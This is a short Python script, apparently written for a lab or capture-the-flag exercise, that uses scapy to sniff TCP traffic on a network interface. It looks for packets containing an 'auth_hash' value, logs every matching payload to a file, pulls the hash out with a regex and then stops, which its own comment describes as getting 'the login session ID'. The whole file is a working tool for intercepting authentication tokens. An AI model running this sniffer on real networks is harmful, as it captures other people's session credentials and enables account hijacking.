import time
from scapy.all import sniff, TCP, Raw
import re
PAYLOAD_FILE = "captured_payloads.txt"


def extract_auth_hash_from_html(html_content):
    """
    Searches for 'auth_hash' variable in the HTML content and extracts its value.
    """
    # Regex to find 'auth_hash' followed by '=', then quotes, and capture content inside quotes.
    pattern = r"auth_hash\s*=\s*[\"']([^\"']+)[\"']"
    match = re.search(pattern, html_content)
    if match:
        return match.group(1).strip() # group(1) contains the captured value
    return None


def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors='ignore')
            # Check if it's an HTTP response (starts with "HTTP/1.")
            # and if the payload likely contains HTML (e.g., contains "<html" or "<body")
            if ("auth_hash" in payload.lower()): 

            # Append the entire payload to the specified file
                with open(PAYLOAD_FILE, "a") as f: # "a" for append mode
                    f.write("--- Start Payload ---\n")
                    f.write(payload)
                    f.write("\n--- End Payload ---\n\n")
            # --- END ADDED LINE ---
                auth_hash_value = extract_auth_hash_from_html(payload)
                if auth_hash_value:
                    print(f"{auth_hash_value}", end='')
                    raise KeyboardInterrupt 

        except Exception as e:
            print(f"Could not decode payload: {e}")


# Start sniffing until we get the login session ID
try:
    sniff(iface="ens3", prn=packet_callback, store=0)
except KeyboardInterrupt:
    print("Sniffing stopped.")
